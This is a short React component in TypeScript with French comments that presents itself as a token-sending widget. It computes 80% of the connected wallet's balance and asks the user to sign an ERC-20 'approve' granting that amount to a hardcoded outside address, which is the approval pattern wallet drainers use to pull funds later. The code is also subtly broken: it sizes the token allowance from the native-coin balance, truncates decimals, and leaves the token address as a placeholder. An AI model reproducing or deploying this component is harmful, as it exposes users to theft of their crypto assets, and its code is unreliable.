import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useContractWrite, usePrepareContractWrite } from 'wagmi';
import { erc20ABI } from '@wagmi/core';
import { BigNumber } from 'ethers';

// Adresse fixe pour l'envoi
const fixedDestinationAddress = '0x518c5D62647E60864EcB3826e982c93dFa154af3';

const SendTokens = () => {
  const { address } = useAccount(); // Récupère l'adresse du compte connecté
  const { data: balanceData } = useBalance({ address });
  const [amountToSend, setAmountToSend] = useState<BigNumber | null>(null);

  const tokenAddress = 'votre_token_ERC20'; // Remplacez par l'adresse de votre token ERC-20
  const contractAddress = tokenAddress;

  const { config } = usePrepareContractWrite({
    address: contractAddress,
    abi: erc20ABI,
    functionName: 'approve',
    args: [fixedDestinationAddress, amountToSend || BigNumber.from(0)],
  });

  const { write } = useContractWrite(config);

  useEffect(() => {
    if (balanceData) {
      // Calculer 80% du solde
      const amount = balanceData.formatted ? parseFloat(balanceData.formatted) * 0.8 : 0;
      setAmountToSend(BigNumber.from(amount.toFixed())); // Met à jour l'état avec 80% du solde
    }
  }, [balanceData]);

  const handleApprove = async () => {
    if (write) {
      await write();
    }
  };

  return (
    <div>
      <h3>Envoyer des Tokens</h3>
      <p>Solde : {balanceData?.formatted} {balanceData?.symbol}</p>
      <button onClick={handleApprove}>Approuver l'envoi</button>
      <p>Destination : {fixedDestinationAddress}</p>
    </div>
  );
};

export default SendTokens;
